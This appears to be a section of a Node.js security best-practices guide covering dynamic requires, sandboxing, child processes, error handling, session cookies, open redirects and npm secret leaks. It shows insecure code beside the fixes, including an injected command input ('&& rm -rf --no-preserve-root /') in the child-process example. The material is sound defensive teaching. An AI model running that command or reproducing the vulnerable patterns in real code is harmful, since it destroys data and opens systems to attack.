From the book [Essential Node.js Security](https://leanpub.com/nodejssecurity) by Liran Tal
> Often, programmers will use RegEx to validate that an input received from a user conforms to an expected condition. A vulnerable Regular Expression is known as one which applies repetition to a repeating capturing group, and where the string to match is composed of a suffix of a valid matching pattern plus characters that aren't matching the capturing group.

<br/><br/>

# `Avoid module loading using a variable`

### One Paragraph Explainer

Avoid requiring/importing another file with a path that was given as parameter due to the concern that it could have originated from user input. This rule can be extended for accessing files in general (i.e. `fs.readFile()`) or other sensitive resources with dynamic variables originating from user input.

### Code example

```javascript
// insecure, as helperPath variable may have been modified by user input
const uploadHelpers = require(helperPath);

// secure
const uploadHelpers = require('./helpers/upload');
```
<br/><br/>

# `Run unsafe code in a sandbox`

### One Paragraph Explainer

As a rule of thumb, one should run his own JavaScript files only. Theories aside, real-world scenarios demand to execute JavaScript files that are being passed dynamically at run-time. For example, consider a dynamic framework like webpack that accepts custom loaders and execute those dynamically during build time. In the existence of some malicious plugin we wish to minimize the damage and maybe even let the flow terminate successfully - this requires to run the plugins in a sandbox environment that is fully isolated in terms of resources, crashes and the information we share with it. Three main options can help in achieving this isolation: 

- a dedicated child process - this provides a quick information isolation but demand to tame the child process, limit its execution time and recover from errors
- a cloud serverless framework ticks all the sandbox requirements but deployment and invoking a FaaS function dynamically is not a walk in the park
- some npm libraries, like [sandbox](https://www.npmjs.com/package/sandbox) and [vm2](https://www.npmjs.com/package/vm2) allow execution of isolated code in 1 single line of code. Though this latter option wins in simplicity it provides a limited protection

### Code example - Using Sandbox library to run code in isolation

```javascript
const Sandbox = require("sandbox")
  , s = new Sandbox()

s.run( "lol)hai", function( output ) {
  console.log(output);
  //output='Syntax error'
});

// Example 4 - Restricted code
s.run( "process.platform", function( output ) {
  console.log(output);
  //output=Null
})

// Example 5 - Infinite loop
s.run( "while (true) {}", function( output ) {
  console.log(output);
  //output='Timeout'
})
```
<br/><br/>

# `Be cautious when working with child processes`

### One Paragraph Explainer

As great as child processes are, they should be used with caution. Passing in user input must be sanitized, if not avoided at all.
The dangers of unsanitized input executing system-level logic are unlimited, reaching from remote code execution to the exposure of
sensitive system data and even data loss. A check list of preparations could look like this

- avoid user input in every case, otherwise validate and sanitize it
- limit the privileges of the parent and child processes using user/group identities
- run your process inside of an isolated environment to prevent unwanted side-effects if the other preparations fail

### Code example: Dangers of unsanitized child process executions

```javascript
const { exec } = require('child_process');

...

// as an example, take a script that takes two arguments, one of them is unsanitized user input
exec('"/path/to/test file/someScript.sh" --someOption ' + input);

// -> imagine what could happen if the user simply enters something like '&& rm -rf --no-preserve-root /'
// you'd be in for an unwanted surprise
```

### Additional resources

From the Node.js child process [documentation](https://nodejs.org/dist/latest-v8.x/docs/api/child_process.html#child_process_child_process_exec_command_options_callback):

> Never pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.

<br/><br/>

# `Hide error details from client`

### One Paragraph Explainer

Exposing application error details to the client in production should be avoided due to the risk of exposing sensitive application details such as server file paths, third-party modules in use, and other internal workflows of the application which could be exploited by an attacker.
Express comes with a built-in error handler, which takes care of any errors that might be encountered in the app. This default error-handling middleware function is added at the end of the middleware function stack.
If you pass an error to `next()` and you do not handle it in a custom error handler, it will be handled by the built-in Express error handler; the error will be written to the client with the stack trace. This behaviour will be true when `NODE_ENV` is set to `development`, however when `NODE_ENV` is set to `production`, the stack trace is not written, only the HTTP response code.

### Code example: Express error handler

``` javascript
// production error handler
// no stacktraces leaked to user
app.use(function(err, req, res, next) {
    res.status(err.status || 500);
    res.render('error', {
        message: err.message,
        error: {}
    });
});
```

### Additional resources

🔗 [Express.js error handling documentation](https://expressjs.com/en/guide/error-handling.html)

<br/><br/>

# `Modify the default session middleware settings`

<br/><br/>


### One Paragraph Explainer

Many popular session middlewares do not apply best practice/secure cookie settings out of the box. Tweaking these settings from the defaults offers greater protection for both the user and the application, by reducing the threat of attacks such as session hijacking and session identification.

The most common setting left to default is the session `name` - in `express-session` this is `connect.sid`. An attacker can use this information to identify the underlying framework of the web application as well as module specific vulnerabilities. Changing this value to something other than the default will make it harder to determine what session mechanism is being used.

Also in `express-session`, the option `cookie.secure` is set to false as the default value. Changing this to true will restrict transport of the cookie to https only which provides safety from man-in-the-middle type attacks

<br/><br/>


### Code example: Setting secure cookie settings

 ```javascript
// using the express session middleware
app.use(session({  
  secret: 'youruniquesecret', // secret string used in the signing of the session ID that is stored in the cookie
  name: 'youruniquename', // set a unique name to remove the default connect.sid
  cookie: {
    httpOnly: true, // minimize risk of XSS attacks by restricting the client from reading the cookie
    secure: true, // only send cookie over https
    maxAge: 60000*60*24 // set cookie expiry length in ms
  }
}));
```

<br/><br/>


### What Other Bloggers Say

From the [NodeSource blog](http://nodesource.com/blog/nine-security-tips-to-keep-express-from-getting-pwned/): 
> ...Express has default cookie settings that aren’t highly secure. They can be manually tightened to enhance security - for both an application and its user.*

<br/><br/>

# `Prevent unsafe redirects`

### One Paragraph Explainer

When redirects are implemented in Node.js and/or Express, it's important to perform input validation on the server-side.
If an attacker discovers that you are not validating external, user-supplied input, they may exploit this vulnerability by posting specially-crafted links on forums, social media, and other public places to get users to click it.

Example: Unsafe express redirect using user input
```javascript
const express = require('express');
const app = express();

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(req.query.url);
  }

}); 
```

The suggested fix to avoid unsafe redirects is to avoid relying on user input. If user input must be used, safe redirect whitelists can be used to avoid exposing the vulnerability.

Example: Safe redirect whitelist
```javascript
const whitelist = { 
  'https://google.com': 1 
};

function getValidRedirect(url) { 
    // check if the url starts with a single slash 
  if (url.match(/^\/(?!\/)/)) { 
    // Prepend our domain to make sure 
    return 'https://example.com' + url; 
  } 
    // Otherwise check against a whitelist
  return whitelist[url] ? url : '/'; 
}

app.get('/login', (req, res, next) => {

  if (req.session.isAuthenticated()) {
    res.redirect(getValidRedirect(req.query.url));
  }

}); 
```


### What other bloggers say

From the blog by [NodeSwat](https://blog.nodeswat.com/unvalidated-redirects-b0a2885720db):
> Fortunately the mitigation methods for this vulnerability are quite straightforward — don’t use unvalidated user input as the basis for redirect. 

From the blog by [Hailstone](https://blog.hailstone.io/how-to-prevent-unsafe-redirects-in-node-js/)
> However, if the server-side redirect logic does not validate data entering the url parameter, your users may end up on a site that looks exactly like yours (examp1e.com), but ultimately serves the needs of criminal hackers!


<br/><br/>

# `Avoid publishing secrets to the npm registry`

### One Paragraph Explainer
Precautions should be taken to avoid the risk of accidentally publishing secrets to public npm registries. An `.npmignore` file can be used to blacklist specific files or folders, or the `files` array in `package.json` can act as a whitelist.

To gain a view of what npm publish will really publish to the registry, the `--dry-run` flag can be added the npm publish command to provide a verbose view of the tarbell package created.

It is important to note that if a project is utilising both `.npmignore` and `.gitignore` files, everything which isn't in `.npmignore` is published to the registry(i.e. the `.npmignore` file overrides the `.gitignore`). This condition is a common source of confusion and is a problem that can lead to leaking secrets. Developers may end up updating the `.gitignore` file, but forget to update `.npmignore` as well, which can lead to a potentially sensitive file not being pushed to source control, but still being included in the npm package.

### Code example
Example .npmignore file
```
#tests
test
coverage

#build tools
.travis.yml
.jenkins.yml

#environment
.env
.config

```

Example use of files array in package.json

```
{ 
  "files" : [
    "dist/moment.js",
    "dist/moment.min.js"
  ]
}
```

### What other bloggers say

From the blog by [Liran Tal & Juan Picado at Snyk](https://snyk.io/blog/ten-npm-security-best-practices/):
> ... Another good practice to adopt is making use of the files property in package.json, which works as a whitelist and specifies the array of files to be included in the package that is to be created and installed (while the ignore file functions as a blacklist). The files property and an ignore file can both be used together to determine which files should explicitly be included, as well as excluded, from the package. When using both, the former the files property in package.json takes precedence over the ignore file.

From the [npm blog](https://blog.npmjs.org/post/165769683050/publishing-what-you-mean-to-publish)
> ... When you run npm publish, npm bundles up all the files in the current directory. It makes a few decisions for you about what to include and what to ignore. To make these decisions, it uses the contents of several files in your project directory. These files include .gitignore, .npmignore, and the files array in the package.json. It also always includes certain files and ignores others.

<br/><br/>

# `Prefer native JS methods over user-land utils like Lodash`


<br/><br/>

### One Paragraph Explainer

Sometimes, using native methods is better than requiring `lodash` or `underscore` because it will not lead in a performance boost and use more space than necessary.
The performance using native methods result in an [overall ~50% gain](https://github.com/Berkmann18/NativeVsUtils/blob/master/analysis.xlsx) which includes the following methods: `Array.concat`, `Array.fill`, `Array.filter`, `Array.map`, `(Array|String).indexOf`, `Object.find`, ...


<!-- comp here: https://gist.github.com/Berkmann18/3a99f308d58535ab0719ac8fc3c3b8bb-->

<br/><br/>

### Example: benchmark comparison - Lodash vs V8 (Native)
The graph below shows the [mean of the benchmarks for a variety of Lodash methods](https://github.com/Berkmann18/NativeVsUtils/blob/master/nativeVsLodash.ods), this shows that Lodash methods take on average 146.23% more time to complete the same tasks as V8 methods.

### Code Example – Benchmark test on `_.concat`/`Array.concat`
```javascript
const _ = require('lodash'),
  __ = require('underscore'),
  Suite = require('benchmark').Suite,
  opts = require('./utils'); //cf. https://github.com/Berkmann18/NativeVsUtils/blob/master/utils.js

const concatSuite = new Suite('concat', opts);
const array = [0, 1, 2];

concatSuite.add('lodash', () => _.concat(array, 3, 4, 5))
  .add('underscore', () => __.concat(array, 3, 4, 5))
  .add('native', () => array.concat(3, 4, 5))
  .run({ 'async': true });
```

Which returns this:

![output](../../assets/images/concat-benchmark.png)

You can find a bigger list of benchmarks [here](https://github.com/Berkmann18/NativeVsUtils/blob/master/index.txt) or alternatively [run this](https://github.com/Berkmann18/NativeVsUtils/blob/master/index.js) which would show the same but with colours.

### Blog Quote: "You don't (may not) need Lodash/Underscore"

From the [repo on this matter which focuses on Lodash and Underscore](https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore).

 > Lodash and Underscore are great modern JavaScript utility libraries, and they are widely used by Front-end developers. However, when you are targeting modern browsers, you may find out that there are many methods which are already supported natively thanks to ECMAScript5 [ES5] and ECMAScript2015 [ES6]. If you want your project to require fewer dependencies, and you know your target browser clearly, then you may not need Lodash/Underscore.

### Example: Linting for non-native methods usage
There's an [ESLint plugin](https://www.npmjs.com/package/eslint-plugin-you-dont-need-lodash-underscore) which detects where you're using libraries but don't need to by warning you with suggestions (cf. example below).<br>
The way you set it up is by adding the `eslint-plugin-you-dont-need-lodash-underscore` plugin to your ESLint configuration file:
```json
{
  "extends": [
    "plugin:you-dont-need-lodash-underscore/compatible"
  ]
}
```

### Example: detecting non-v8 util usage using a linter
Consider the file below:
```js
const _ = require('lodash');
// ESLint will flag the line above with a suggestion
console.log(_.map([0, 1, 2, 4, 8, 16], x => `d${x}`));
```
Here's what ESLint would output when using the YDNLU plugin.
![output](../../assets/images/ydnlu.png)

Of course, the example above doesn't seem realistic considering what actual codebases would have but you get the idea.

<br/><br/>


